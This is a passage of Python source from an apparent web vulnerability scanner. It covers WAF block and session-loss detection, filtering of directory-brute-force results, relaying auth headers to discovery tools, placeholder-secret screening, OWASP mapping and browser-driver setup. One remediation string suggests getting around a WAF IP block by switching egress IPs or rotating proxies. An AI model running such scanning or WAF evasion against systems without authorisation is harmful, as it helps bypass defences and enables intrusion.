    regardless of the HTTP status code it reported."""
    if not text or len(text.strip()) < 20:
        return True                          # empty / trivially short body
    if _DEAD_TITLE_RE.search(text):
        return True                          # <title> explicitly says 404/not-found
    lower = text.lower()
    if any(phrase in lower for phrase in _DEAD_BODY_PHRASES):
        return True                          # body phrase matches known error copy
    # Strip all HTML tags and measure visible text length
    _visible = re.sub(r"<[^>]+>", " ", text)
    _visible = re.sub(r"\s+", " ", _visible).strip()
    if len(_visible) < _WC_DEAD_MIN_TEXT:
        return True                          # virtually no visible content
    return False


def _is_waf_block(r: "requests.Response") -> bool:
    """Return True if *r* looks like a WAF/CDN IP-block page rather than real content.

    Used to suppress false-positive 403 results from gobuster/feroxbuster when a
    WAF (Akamai, Cloudflare, etc.) blocks the scanner IP mid-scan and returns the
    same block page for every subsequent request — even through the requests session.
    """
    server = r.headers.get("Server", "") or r.headers.get("Via", "") or ""
    body   = r.text[:4096] if r.text else ""
    if _WAF_SERVER_RE.search(server) and r.status_code in (403, 406, 429, 503):
        return True
    if _WAF_BODY_RE.search(body):
        return True
    return False


def _waf_session_health(
    target_url: str,
    sess: "requests.Session",
    timeout: int,
    out: "OutputManager",
    target: dict,
    waf_cdn: str,
    role_label: str = "",
) -> str:
    """Probe the target root URL to detect WAF IP-block or session termination.

    Only meaningful when *waf_cdn* is non-empty (i.e. a WAF/CDN was detected
    during recon).  Designed to be called at phase boundaries so that Fracture
    can report mid-scan IP blocks or session revocations before continuing with
    phases whose results would be meaningless.

    Returns one of:
        "ok"                 — target responding normally
        "ip_blocked"         — WAF/CDN is blocking all requests from this IP
        "session_terminated" — authenticated session was revoked
        "challenge"          — WAF is serving a JS challenge / CAPTCHA
    Emits an appropriate finding for any non-ok result.
    """
    if not waf_cdn:
        return "ok"

    _lbl = f" [{role_label}]" if role_label else ""
    try:
        _probe = sess.get(target_url, timeout=min(timeout, 10),
                          allow_redirects=False, verify=False)
    except Exception:
        return "ok"

    _status = _probe.status_code
    _body   = (_probe.text or "")[:4096]
    _loc    = _probe.headers.get("Location", "") or ""

    # ── IP block ──────────────────────────────────────────────────────────────
    if _is_waf_block(_probe):
        _msg = (
            f"WAF/CDN ({waf_cdn}) is blocking all requests from this scanner IP. "
            f"HTTP {_status} received on root URL probe. "
            "Subsequent scan results from this point forward may be unreliable."
        )
        vc.log(
            f"[waf-health{_lbl}] IP BLOCK — {waf_cdn} returned WAF block page "
            f"(HTTP {_status})",
            "CRITICAL",
        )
        out.add_finding(
            title=f"WAF/CDN IP Block Detected: {waf_cdn}",
            url=target_url, port=target.get("port", 443), risk="HIGH",
            description=_msg,
            output=f"HTTP {_status}\n{_body[:512]}",
            affected=target_url, sources="fracture-waf-health",
            service=target.get("scheme", "https"),
            command=f"GET {target_url}",
            owasp="A05:2021 – Security Misconfiguration", nist="SI-4",
            remediation=(
                "This scanner's IP has been blocked by the WAF/CDN. "
                "Consider using a different egress IP, rotating through a proxy, "
                "or temporarily allowlisting the scanner IP in the WAF policy for "
                "the duration of the authorised engagement."
            ),
        )
        return "ip_blocked"

    # ── Challenge / CAPTCHA ───────────────────────────────────────────────────
    if _WAF_CHALLENGE_RE.search(_body):
        _msg = (
            f"WAF/CDN ({waf_cdn}) is serving a challenge or CAPTCHA page instead of "
            f"real content (HTTP {_status}). "
            "Automated probe results may be incomplete or inaccurate while the "
            "challenge is active."
        )
        vc.log(
            f"[waf-health{_lbl}] CHALLENGE PAGE — {waf_cdn} serving challenge "
            f"(HTTP {_status})",
            "WARNING",
        )
        out.add_finding(
            title=f"WAF/CDN Challenge Page Active: {waf_cdn}",
            url=target_url, port=target.get("port", 443), risk="INFO",
            description=_msg,
            output=f"HTTP {_status}\n{_body[:512]}",
            affected=target_url, sources="fracture-waf-health",
            service=target.get("scheme", "https"),
            command=f"GET {target_url}",
            owasp="A05:2021 – Security Misconfiguration", nist="SI-4",
            remediation="Informational — no remediation required for the WAF challenge itself.",
        )
        return "challenge"

    # ── Session termination — 401/403 at root ────────────────────────────────
    if _status == 401:
        _msg = (
            f"Root URL returned HTTP 401 while {waf_cdn} is active{_lbl}. "
            "The authenticated session may have been revoked by the WAF or "
            "application server mid-scan. Results from authenticated phases "
            "following this point may be inaccurate."
        )
        vc.log(
            f"[waf-health{_lbl}] SESSION TERMINATED — HTTP 401 on root URL",
            "WARNING",
        )
        out.add_finding(
            title=f"WAF/CDN Session Termination Detected: {waf_cdn}",
            url=target_url, port=target.get("port", 443), risk="INFO",
            description=_msg,
            output=f"HTTP {_status}\n{_body[:512]}",
            affected=target_url, sources="fracture-waf-health",
            service=target.get("scheme", "https"),
            command=f"GET {target_url}",
            owasp="A07:2021 – Identification and Authentication Failures", nist="IA-3",
            remediation=(
                "Re-authenticate to the target and resume the scan from this phase. "
                "Consider adding a longer delay between scan phases to reduce the "
                "chance of session revocation by WAF bot-detection heuristics."
            ),
        )
        return "session_terminated"

    # ── Session termination — redirect to login ───────────────────────────────
    if _status in (301, 302, 307, 308) and _WAF_LOGIN_URL_RE.search(_loc):
        _msg = (
            f"Authenticated session{_lbl} redirected to a login URL ({_loc}) — "
            f"the WAF or application server terminated the session mid-scan "
            f"({waf_cdn} active, HTTP {_status}). "
            "Results from authenticated phases following this point may be inaccurate."
        )
        vc.log(
            f"[waf-health{_lbl}] SESSION TERMINATED — redirected to login: {_loc} "
            f"(HTTP {_status})",
            "WARNING",
        )
        out.add_finding(
            title=f"WAF/CDN Session Termination Detected: {waf_cdn}",
            url=target_url, port=target.get("port", 443), risk="INFO",
            description=_msg,
            output=f"HTTP {_status} Location: {_loc}",
            affected=target_url, sources="fracture-waf-health",
            service=target.get("scheme", "https"),
            command=f"GET {target_url}",
            owasp="A07:2021 – Identification and Authentication Failures", nist="IA-3",
            remediation=(
                "Re-authenticate to the target and resume the scan from this phase. "
                "Consider adding a longer delay between scan phases to reduce the "
                "chance of session revocation by WAF bot-detection heuristics."
            ),
        )
        return "session_terminated"

    # ── Session termination — login body on 200 ───────────────────────────────
    if _status == 200 and _WAF_LOGIN_BODY_RE.search(_body):
        _msg = (
            f"Root URL returned HTTP 200 but the response body contains "
            f"login/session-expired indicators while {waf_cdn} is active{_lbl}. "
            "The session may have been silently terminated. "
            "Results from authenticated phases following this point may be inaccurate."
        )
        vc.log(
            f"[waf-health{_lbl}] POSSIBLE SESSION TERMINATION — login body on root "
            f"URL (HTTP 200)",
            "WARNING",
        )
        out.add_finding(
            title=f"WAF/CDN Possible Session Termination: {waf_cdn}",
            url=target_url, port=target.get("port", 443), risk="INFO",
            description=_msg,
            output=f"HTTP {_status}\n{_body[:512]}",
            affected=target_url, sources="fracture-waf-health",
            service=target.get("scheme", "https"),
            command=f"GET {target_url}",
            owasp="A07:2021 – Identification and Authentication Failures", nist="IA-3",
            remediation=(
                "Verify that the authenticated session is still valid. "
                "If the session was terminated, re-authenticate and resume the scan."
            ),
        )
        return "session_terminated"

    return "ok"


def _filter_dominant_code(
    results: "list[tuple[str, int | None, str | None]]",
    sess: "requests.Session",
    timeout: int,
) -> "list[tuple[str, int | None, str | None]]":
    """Source-code validation pass applied after wildcard filtering.

    When >80 % of the remaining results share one HTTP status code, re-fetch
    every entry with that code and inspect its response body for dead-endpoint
    indicators (404-equivalent page titles, not-found phrases, minimal visible
    text) or WAF/CDN block pages.  Confirmed dead or WAF-blocked entries are
    suppressed; entries with genuine content — and all entries with non-dominant
    codes — are returned unchanged.
    """
    if not results:
        return results

    all_codes = [s for _, s, _ in results if s is not None]
    if len(all_codes) < 5:
        return results

    from collections import Counter
    dominant_code, dominant_count = Counter(all_codes).most_common(1)[0]
    ratio = dominant_count / len(all_codes)

    if ratio <= _WC_DOMINANT_RATIO:
        return results

    vc.log(
        f"[buster-filter] {dominant_count}/{len(all_codes)} results "
        f"({ratio:.0%}) share HTTP {dominant_code} — "
        f"source-validating dominant-code entries for dead endpoints",
        "INFO",
    )

    # ── Categorical-block fast path ──────────────────────────────────────────
    # Probe 3 random non-existent UUID paths under the scan base directory
    # using the same session.  If ≥2 of those paths also return the dominant
    # code then the scanner IP has been categorically blocked (e.g. by Akamai,
    # Cloudflare, or any WAF that doesn't advertise itself in headers/body),
    # or the server uses the dominant code as its wildcard "not found" response.
    # Either way the dominant-code results carry no signal — suppress them all
    # at once rather than relying on body fingerprinting, which fails for custom
    # block pages.
    #
    # The probe base is the longest common directory prefix of the dominant-code
    # URLs so that probes land in the same path space as the scan (e.g. /cognos/
    # rather than the server root), giving an apples-to-apples comparison.
    _dom_urls = [u for u, s, _ in results if s == dominant_code]
    if _dom_urls:
        try:
            import uuid as _uuid_mod
            from urllib.parse import urlparse as _urlparse
            import os.path as _osp
            _pr0 = _urlparse(_dom_urls[0])
            _origin = f"{_pr0.scheme}://{_pr0.netloc}"
            # Find common path prefix across all dominant-code URLs
            _paths = [_urlparse(u).path for u in _dom_urls]
            _common = _paths[0]
            for _p in _paths[1:]:
                while _common and not _p.startswith(_common):
                    _common = _common.rsplit("/", 1)[0]
            # Ensure we have at least a "/" base; strip trailing slash for clean join
            _base_path = _common.rstrip("/") or ""
            _cat_hits = 0
            for _ in range(3):
                try:
                    _pv = sess.get(
                        f"{_origin}{_base_path}/{_uuid_mod.uuid4().hex}",
                        timeout=max(timeout // 2, 3),
                        allow_redirects=False,
                        headers={"Accept": "text/html"},
                    )
                    if _pv.status_code == dominant_code:
                        _cat_hits += 1
                except Exception:
                    pass
            if _cat_hits >= 2:
                _cat_total = sum(1 for _, s, _ in results if s == dominant_code)
                vc.log(
                    f"[buster-filter] {_cat_hits}/3 random non-existent paths under "
                    f"'{_base_path or '/'}' returned HTTP {dominant_code} — categorical "
                    f"WAF/CDN block or wildcard detected; suppressing all "
                    f"{_cat_total} HTTP {dominant_code} result(s)",
                    "INFO",
                )
                return [e for e in results if e[1] != dominant_code]
        except Exception:
            pass  # if anything goes wrong fall through to per-entry logic

    kept       = []
    _suppressed = 0
    for entry in results:
        url, status, redirect = entry
        if status != dominant_code:
            kept.append(entry)
            continue
        # Re-fetch and inspect source code for 404-indicating content or WAF block
        try:
            _rv = sess.get(
                url,
                timeout=max(timeout // 2, 3),
                allow_redirects=True,
                headers={"Accept": "text/html,application/json"},
            )
            if _is_dead_endpoint_body(_rv.text) or _is_waf_block(_rv):
                _suppressed += 1
                continue
        except Exception:
            pass  # network error — keep the entry (conservative)
        kept.append(entry)

    if _suppressed:
        vc.log(
            f"[buster-filter] Suppressed {_suppressed} dead-endpoint or WAF-blocked "
            f"HTTP {dominant_code} result(s) — "
            f"source code confirms no real content (404-equivalent or WAF block page)",
            "INFO",
        )
    return kept


def _buster_auth_flags(sess: "requests.Session") -> list:
    """Return repeated -H flag pairs for gobuster/feroxbuster.

    Extracts cookies, Authorization, and common auth headers from the
    authenticated session so that discovery tools run with the same
    access level as the requests session — preventing thousands of
    false-positive 403 results caused by unauthenticated discovery
    against a site that requires login.
    """
    flags: list = []

    # Session cookies → Cookie header
    cookie_str = "; ".join(f"{c.name}={c.value}" for c in sess.cookies)
    if cookie_str:
        flags += ["-H", f"Cookie: {cookie_str}"]

    # Auth-relevant headers already set on the session
    _RELAY = frozenset({
        "authorization", "x-auth-token", "x-api-key", "x-access-token",
        "x-session-token", "token",
    })
    for hname, hval in sess.headers.items():
        if hname.lower() in _RELAY:
            flags += ["-H", f"{hname}: {hval}"]

    # HTTP Basic auth tuple — only when Authorization not already added above
    if (isinstance(getattr(sess, "auth", None), tuple)
            and len(sess.auth) == 2
            and not any(h.lower() == "authorization" for h in sess.headers)):
        import base64 as _b64
        _creds = _b64.b64encode(
            f"{sess.auth[0]}:{sess.auth[1]}".encode()
        ).decode()
        flags += ["-H", f"Authorization: Basic {_creds}"]

    return flags


# ─────────────────────────────────────────────
# Placeholder / code-comment secret filter
# ─────────────────────────────────────────────

_PLACEHOLDER_RE = re.compile(
    r"""(?ix)
    ^(
        your[_\-]?password | change[_\-]?me | changeme | enter[_\-]?password |
        password(?:123|_here|go|example)? | pa[s$]{2}w[o0]rd | secret(?:_key|_here)? |
        example | placeholder | dummy | test(?:pass|ing|123)? | todo | fixme |
        x{3,} | null | none | undefined | n/a |
        your[_\-]?api[_\-]?key | api[_\-]?key[_\-]?here | token[_\-]?here |
        replace[_\-]?this | fill[_\-]?in | sample |
        \$\{[^}]+\} | \{{2}[^}]+\}{2} | %[a-z_]+% | <[^>]+>
    )$
    """,
    re.IGNORECASE | re.VERBOSE,
)

_TEMPLATE_SYNTAX_RE = re.compile(
    r'(?:[{<\[]\s*[A-Za-z_][A-Za-z0-9_\-]*\s*[}>:\]]|'   # {VAR}, <VAR>, [VAR]
    r'\$\{[^}]+\}|'                                          # ${VAR}
    r'%[A-Za-z_]+%)',                                        # %VAR%
)


def _is_placeholder_secret(value: str, key_name: str = "") -> bool:
    """Return True when the matched secret value is likely a template placeholder
    or code comment rather than a real credential.

    Called by the crawl phase before recording a password/secret finding.
    """
    v = (value or "").strip().strip("\"'")
    if not v:
        return True
    if _PLACEHOLDER_RE.match(v):
        return True
    if _TEMPLATE_SYNTAX_RE.search(v):
        return True
    # All-uppercase alphanumeric with underscores → ENV_VAR_STYLE_PLACEHOLDER
    if re.match(r'^[A-Z][A-Z0-9_]{3,}$', v):
        return True
    # Self-referential: value equals the key name (e.g. e.addedApiKey="addedApiKey")
    # or value contains the full key name as a substring (case-insensitive)
    if key_name:
        k = key_name.strip().strip("\"'")
        if v.lower() == k.lower():
            return True
        if k.lower() in v.lower() and len(v) <= len(k) + 10:
            return True
    # Readable camelCase/snake_case identifier — real secrets are not pronounceable
    # phrases. Flag values that look like enum keys or event names.
    if re.match(r'^[a-z][a-zA-Z0-9]*(?:[A-Z][a-zA-Z0-9]*){2,}$', v) and len(v) <= 40:
        # camelCase with 3+ words and no digits run → likely an identifier, not a secret
        if not re.search(r'\d{4,}', v):
            return True
    # Code expression — value is a variable dereference, not a literal.
    # Covers: array subscript (a[4], params[idx]), function calls (getPass()),
    # and property chains (config.password, this.pwd).
    # Real credential literals do not contain [ or ( and are not dotted identifiers.
    if '[' in v or '(' in v:
        return True
    if re.match(r'^[A-Za-z_$][\w$]*(?:\.\w+)+$', v):
        return True
    # JavaScript/Python falsy / null literals that are never real secrets.
    if v.lower() in ("null", "undefined", "true", "false", "none", "nil",
                     "nan", "infinity", "unknown", "n/a"):
        return True
    return False


def _normalize_finding_title(title: str) -> str:
    t = (title or "").strip()
    for pat, repl in _TITLE_NORM_SUBS:
        t = pat.sub(repl, t)
    return t


# ─────────────────────────────────────────────
# OWASP Top 10 2025 mapping
# ─────────────────────────────────────────────
_OWASP_TOP10: dict = {
    "A01": ("A01:2025 - Broken Access Control",
            "https://owasp.org/Top10/A01_2025-Broken_Access_Control/"),
    "A02": ("A02:2025 - Cryptographic Failures",
            "https://owasp.org/Top10/A02_2025-Cryptographic_Failures/"),
    "A03": ("A03:2025 - Injection",
            "https://owasp.org/Top10/A03_2025-Injection/"),
    "A04": ("A04:2025 - Insecure Design",
            "https://owasp.org/Top10/A04_2025-Insecure_Design/"),
    "A05": ("A05:2025 - Security Misconfiguration",
            "https://owasp.org/Top10/A05_2025-Security_Misconfiguration/"),
    "A06": ("A06:2025 - Vulnerable and Outdated Components",
            "https://owasp.org/Top10/A06_2025-Vulnerable_and_Outdated_Components/"),
    "A07": ("A07:2025 - Identification and Authentication Failures",
            "https://owasp.org/Top10/A07_2025-Identification_and_Authentication_Failures/"),
    "A08": ("A08:2025 - Software and Data Integrity Failures",
            "https://owasp.org/Top10/A08_2025-Software_and_Data_Integrity_Failures/"),
    "A09": ("A09:2025 - Security Logging and Monitoring Failures",
            "https://owasp.org/Top10/A09_2025-Security_Logging_and_Monitoring_Failures/"),
    "A10": ("A10:2025 - Server-Side Request Forgery",
            "https://owasp.org/Top10/A10_2025-Server-Side_Request_Forgery_%28SSRF%29/"),
}


def _owasp_auto(title: str) -> str:
    """Return the OWASP Top 10 2025 A-code that best fits a finding title."""
    t = (title or "").lower()
    if any(k in t for k in ("ssrf", "server-side request forgery", "server side request forgery")):
        return "A10"
    if any(k in t for k in ("sql injection", "sqli", "command injection", "code injection",
                             "ldap injection", "xpath injection", "xxe", "template injection",
                             "xss", "cross-site scripting", "html injection", "log4j", "injection")):
        return "A03"
    if any(k in t for k in ("broken access", "access control", "idor", "bola", "privilege",
                             "unauthorized", "path traversal", "directory traversal",
                             "insecure direct object")):
        return "A01"
    if any(k in t for k in ("tls", "ssl", "cipher", "certificate", "heartbleed", "poodle",
                             "beast", "crime", "drown", "logjam", "freak", "sweet32", "lucky13",
                             "rc4", "null cipher", "export cipher", "deprecated protocol",
                             "cryptograph", "weak cipher")):
        return "A02"
    if any(k in t for k in ("authentication", "session", "credential", "password", "login",
                             "jwt", "brute force", "account lockout", "multi-factor", "mfa",
                             "identification")):
        return "A07"
    if any(k in t for k in ("exploit", "searchsploit", "public exploit", "vulnerable", "outdated",
                             "component", "technology identified", "web server identified",
                             "technology stack")):
        return "A06"
    if any(k in t for k in ("deserialization", "integrity", "supply chain", "unsigned")):
        return "A08"
    if any(k in t for k in ("logging", "monitoring", "audit", "detection")):
        return "A09"
    if any(k in t for k in ("csrf", "cross-site request forgery", "insecure design")):
        return "A04"
    return "A05"


def _owasp_resolve(owasp: str, title: str = "") -> "tuple[str, str]":
    """Return (canonical_name, url) from an OWASP code/label, or auto-detect from title."""
    m = re.match(r'A(\d+)', owasp or "", re.I)
    if m:
        key = f"A{int(m.group(1)):02d}"
        entry = _OWASP_TOP10.get(key)
        if entry:
            return entry
    key = _owasp_auto(title)
    return _OWASP_TOP10.get(key, ("", ""))


def _parse_software(text: str) -> "tuple[str, str]":
    """Parse a software identifier into (name, version).

    'Apache/2.4.41 (Ubuntu)' → ('Apache', '2.4.41')
    'PHP/7.4.3'              → ('PHP', '7.4.3')
    'nginx 1.18.0'           → ('nginx', '1.18.0')
    'WordPress'              → ('WordPress', '')
    """
    text = re.sub(r'\s*\(.*?\)\s*', ' ', text).strip()
    if '/' in text:
        name, _, ver = text.partition('/')
        return name.strip(), ver.strip()
    m = re.match(r'^(.*?)\s+(\d[\d.\-a-zA-Z]*)$', text.strip())
    if m:
        return m.group(1).strip(), m.group(2).strip()
    return text.strip(), ""


# ─────────────────────────────────────────────
# Selenium / screenshot helpers  (lazy, optional)
# ─────────────────────────────────────────────

def _find_chromedriver() -> "str | None":
    """Return path to chromedriver, checking PATH then known absolute locations."""
    for name in ("chromedriver", "chromium-driver", "chromium.chromedriver"):
        found = shutil.which(name)
        if found:
            return found
    # _CHROMEDRIVER_PATHS is defined after the third-party imports block
    # but we keep this function early so it can be referenced by _build_chrome_service
    for p in [
        "/opt/homebrew/bin/chromedriver",
        "/usr/local/bin/chromedriver",
        "/usr/bin/chromedriver",
        "/usr/bin/chromium-driver",
        "/usr/bin/chromium.chromedriver",
        "/usr/lib/chromium/chromedriver",
        "/usr/lib/chromium-browser/chromedriver",
        "/snap/bin/chromium.chromedriver",
        "/private/tmp/chromedriver146/chromedriver-mac-x64/chromedriver",
    ]:
        if Path(p).exists():
            return p
    # macOS: ask brew for its prefix in case Homebrew root is non-standard
    if platform.system() == "Darwin":
        try:
            result = subprocess.run(
                ["brew", "--prefix"], capture_output=True, text=True, timeout=5,
            )
            prefix = result.stdout.strip()
            if prefix:
                candidate = Path(prefix) / "bin" / "chromedriver"
                if candidate.exists():
                    return str(candidate)
        except Exception:
            pass
        # Check real user's PATH entries when running under sudo
        sudo_user = os.environ.get("SUDO_USER", "")
        if sudo_user:
            sudo_path = os.environ.get("PATH", "")
            for d in sudo_path.split(":"):
                candidate = Path(d) / "chromedriver"
                if candidate.exists():
                    return str(candidate)
    return None


def _find_chrome_binary() -> "str | None":
    """Return path to Chrome/Chromium browser binary, or None."""
    if platform.system() == "Darwin":
        _MACOS_APPS = [
            ("Google Chrome.app", "Google Chrome"),
            ("Chromium.app",      "Chromium"),
            ("Brave Browser.app", "Brave Browser"),
            ("Microsoft Edge.app","Microsoft Edge"),
        ]
        app_roots = [Path("/Applications")]
        sudo_user = os.environ.get("SUDO_USER", "")
        if sudo_user:
            try:
                import pwd as _pwd
                user_home = Path(_pwd.getpwnam(sudo_user).pw_dir)
            except Exception:
                user_home = Path(f"/Users/{sudo_user}")
            app_roots.append(user_home / "Applications")
        else:
            app_roots.append(Path.home() / "Applications")
        for root in app_roots:
            for app_name, bin_name in _MACOS_APPS:
                candidate = root / app_name / "Contents" / "MacOS" / bin_name
                if candidate.exists():
                    return str(candidate)
    for p in [
        "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable",
        "/usr/bin/chromium", "/usr/bin/chromium-browser",
        "/snap/bin/chromium", "/usr/bin/brave-browser",
    ]:
        if Path(p).exists():
            return p
    for name in ("google-chrome", "google-chrome-stable", "chromium",
                 "chromium-browser", "brave-browser"):
        found = shutil.which(name)
        if found:
            return found
    return None


def _build_chrome_service():
    """Return a selenium Service object pointing at a usable chromedriver."""
    from selenium.webdriver.chrome.service import Service  # noqa: F401
    if platform.system() == "Darwin":
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            return Service(ChromeDriverManager().install())
        except Exception:
            pass
    driver = _find_chromedriver()
    if driver:
        return Service(driver)
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        return Service(ChromeDriverManager().install())
    except Exception as exc:
        raise RuntimeError(f"No chromedriver found: {exc}") from exc


def _find_geckodriver() -> "str | None":
    """Return path to geckodriver (Firefox WebDriver), checking PATH then known locations."""
    found = shutil.which("geckodriver")
    if found:
        return found
    for p in [
        "/opt/homebrew/bin/geckodriver",
        "/usr/local/bin/geckodriver",
        "/usr/bin/geckodriver",
        "/usr/lib/geckodriver",
        "/snap/bin/geckodriver",
    ]:
        if Path(p).exists():
            return p
    if platform.system() == "Darwin":
        try:
            result = subprocess.run(
                ["brew", "--prefix"], capture_output=True, text=True, timeout=5,
            )
            prefix = result.stdout.strip()
            if prefix:
                candidate = Path(prefix) / "bin" / "geckodriver"
                if candidate.exists():
                    return str(candidate)
        except Exception:
            pass
    return None


def _find_firefox_binary() -> "str | None":
    """Return path to Firefox browser binary, or None."""
    if platform.system() == "Darwin":
        sudo_user = os.environ.get("SUDO_USER", "")
        app_roots = [Path("/Applications")]
        if sudo_user:
            try:
                import pwd as _pwd
                app_roots.append(Path(_pwd.getpwnam(sudo_user).pw_dir) / "Applications")
            except Exception:
                app_roots.append(Path(f"/Users/{sudo_user}") / "Applications")
        else:
            app_roots.append(Path.home() / "Applications")
        for root in app_roots:
            candidate = root / "Firefox.app" / "Contents" / "MacOS" / "firefox"
            if candidate.exists():
                return str(candidate)
    for p in [
        "/usr/bin/firefox", "/usr/bin/firefox-esr",
        "/usr/lib/firefox/firefox", "/usr/lib/firefox-esr/firefox-esr",
        "/snap/bin/firefox",
    ]:
        if Path(p).exists():
            return p
    for name in ("firefox", "firefox-esr"):
        found = shutil.which(name)
        if found:
            return found
    return None


def _build_firefox_service():
    """Return a selenium Service object pointing at a usable geckodriver."""
    from selenium.webdriver.firefox.service import Service
    driver = _find_geckodriver()
    if driver:
        return Service(driver)
    try:
        from webdriver_manager.firefox import GeckoDriverManager
        return Service(GeckoDriverManager().install())
    except Exception as exc:
        raise RuntimeError(f"No geckodriver found: {exc}") from exc


def _check_selenium() -> bool:
    """Return True if selenium is importable and Chrome is available.  Result is cached."""
    global _SELENIUM_AVAILABLE
    if _SELENIUM_AVAILABLE is not None:
        return _SELENIUM_AVAILABLE
    try:
        from selenium import webdriver                          # noqa: F401
        from selenium.webdriver.chrome.options import Options  # noqa: F401
        _SELENIUM_AVAILABLE = True
        return True
    except ImportError:
        pass
    # macOS sudo: selenium may be installed for python3 but not in sys.path
    try:
        result = subprocess.run(
            ["python3", "-c", "import selenium"],
            capture_output=True, timeout=5,
        )
        if result.returncode == 0:
            site_res = subprocess.run(
                ["python3", "-c",
                 "import site, json; print(json.dumps(site.getsitepackages()))"],
                capture_output=True, text=True, timeout=5,
            )
            if site_res.returncode == 0:
                for p in json.loads(site_res.stdout.strip()):
                    if p and p not in sys.path:
                        sys.path.insert(0, p)
            try:
                from selenium import webdriver                          # noqa: F401
                from selenium.webdriver.chrome.options import Options  # noqa: F401
                _SELENIUM_AVAILABLE = True
                return True
            except ImportError:
                pass
    except Exception:
        pass
    _SELENIUM_AVAILABLE = False
    return False


def _get_spa_browser() -> "str | None":
    """Return the best available headless browser for SPA crawling.

    Returns 'chrome', 'firefox', or None.  Chrome is preferred; Firefox is the
    fallback when Chrome/chromedriver is absent.  Result is cached after the
    first call.
    """
    global _SPA_BROWSER_CACHE, _SPA_BROWSER_CHECKED
    if _SPA_BROWSER_CHECKED:
        return _SPA_BROWSER_CACHE

    # selenium must be importable at all (reuses _check_selenium's sys.path fixup)
    if not _check_selenium():
        _SPA_BROWSER_CHECKED = True
        _SPA_BROWSER_CACHE   = None
        return None

    # Chrome: prefer if chromedriver or chrome binary is locatable
    try:
        from selenium.webdriver.chrome.options import Options as _CO  # noqa: F401
        if _find_chromedriver() or _find_chrome_binary():
            _SPA_BROWSER_CHECKED = True
            _SPA_BROWSER_CACHE   = "chrome"
            return "chrome"
        # webdriver_manager can fetch chromedriver on demand
        try:
            from webdriver_manager.chrome import ChromeDriverManager as _CDM  # noqa: F401
            _SPA_BROWSER_CHECKED = True
            _SPA_BROWSER_CACHE   = "chrome"
            return "chrome"
        except ImportError:
            pass
    except ImportError:
        pass

    # Firefox fallback: geckodriver or firefox binary locatable
    try:
        from selenium.webdriver.firefox.options import Options as _FO  # noqa: F401
        if _find_geckodriver() or _find_firefox_binary():
            _SPA_BROWSER_CHECKED = True
            _SPA_BROWSER_CACHE   = "firefox"
            return "firefox"
        try:
            from webdriver_manager.firefox import GeckoDriverManager as _GDM  # noqa: F401
            _SPA_BROWSER_CHECKED = True
            _SPA_BROWSER_CACHE   = "firefox"
            return "firefox"
        except ImportError:
            pass
    except ImportError:
        pass

    _SPA_BROWSER_CHECKED = True
    _SPA_BROWSER_CACHE   = None
    return None


# ─────────────────────────────────────────────
# Third-party dependency bootstrap
# ─────────────────────────────────────────────
_THIRD_PARTY_DEPS = [
    ("requests",      "requests",  "HTTP library for web probing"),
    ("colorama",      "colorama",  "ANSI color output"),
    ("beautifulsoup4","bs4",       "HTML parsing for crawl/form discovery"),
]

_REQUIRED_PKGS = {"requests", "colorama"}


def _is_importable(module: str) -> bool:
    try:
        return importlib.util.find_spec(module) is not None
    except (ModuleNotFoundError, ValueError):
        return False


def _pip_install(pkg: str, break_system: bool = False) -> tuple:
    pip_exe = "python3" if platform.system() == "Darwin" else sys.executable
    cmd = [pip_exe, "-m", "pip", "install", "--quiet"]
    if break_system:
        cmd.append("--break-system-packages")
    cmd.append(pkg)
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode == 0:
        return True, ""
    return False, (proc.stderr or proc.stdout).strip()


def _ensure_dependencies() -> None:
    missing = [
        (pkg, mod, desc)
        for pkg, mod, desc in _THIRD_PARTY_DEPS
        if not _is_importable(mod)
    ]
    if not missing:
        return

    _vantage_early = os.environ.get("CRUCIBLE_MANAGED", "") == "1"
    if _vantage_early:
        for pkg, mod, desc in missing:
            required = pkg in _REQUIRED_PKGS
            break_sys = platform.system() == "Linux"
            sys.stdout.write(f"[Vantage] Auto-installing Python package: {pkg} ...\n")
            sys.stdout.flush()
            ok, _err = _pip_install(pkg, break_system=break_sys)
            if ok:
                importlib.invalidate_caches()
                ok = _is_importable(mod)
            if ok:
                sys.stdout.write(f"[Vantage] {pkg} installed OK\n")
                sys.stdout.flush()
            elif required:
                sys.stderr.write(f"[Vantage] FATAL: could not install required package '{pkg}'.\n")
                sys.stderr.flush()
                sys.exit(1)
            else:
                sys.stdout.write(f"[Vantage] Warning: optional '{pkg}' install failed — some features may be unavailable.\n")
                sys.stdout.flush()
        return

    os_name = platform.system()
    print("\n[!] The following Python packages are not installed:\n")
    width = max(len(pkg) for pkg, _, _ in missing)
    for pkg, mod, desc in missing:
        tag = "[REQUIRED]" if pkg in _REQUIRED_PKGS else "[optional]"
        print(f"    {tag}  {pkg:<{width}}  —  {desc}")
    print()

    for pkg, mod, desc in missing:
        required  = pkg in _REQUIRED_PKGS
        req_label = "REQUIRED" if required else "optional"
        break_sys = os_name == "Linux"
        install_via = "pip --break-system-packages" if break_sys else "pip"

        try:
            answer = input(f"[?] Install '{pkg}' ({req_label}) via {install_via}? [Y/n]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            answer = "n"

        if answer in ("", "y", "yes"):
            print(f"    Installing {pkg} via pip ...", end="", flush=True)
            ok, err = _pip_install(pkg, break_system=break_sys)
            if ok:
                importlib.invalidate_caches()
                ok = _is_importable(mod)
            if ok:
                print(" done.")
            else:
                print(" FAILED.")
                if err:
                    for line in err.splitlines()[:6]:
                        print(f"    {line}")
                if required:
                    print(f"\n[!] '{pkg}' could not be installed and is required.\n"
                          f"    Fix:  pip install {pkg}\n"
                          f"    Then re-run fracture.py.\n")
                    sys.exit(1)
                else:
                    print(f"    [~] Continuing without '{pkg}'; some features may be unavailable.")
        else:
            if required:
                print(f"\n[!] '{pkg}' is required. Cannot continue without it.\n"
                      f"    Fix:  pip install {pkg}\n"
                      f"    Then re-run fracture.py.\n")
                sys.exit(1)
            else:
                print(f"    [~] Skipping '{pkg}'; some features may be unavailable.")

    print()


_ensure_dependencies()

# ─────────────────────────────────────────────
# Third-party imports  (guaranteed present now)
# ─────────────────────────────────────────────
warnings.filterwarnings("ignore", message="urllib3 v2 only supports OpenSSL")
import colorama                          # noqa: E402
import requests                          # noqa: E402
from colorama import Fore, Style         # noqa: E402

try:
    from bs4 import BeautifulSoup
    _BS4_AVAILABLE = True
except ImportError:
    _BS4_AVAILABLE = False

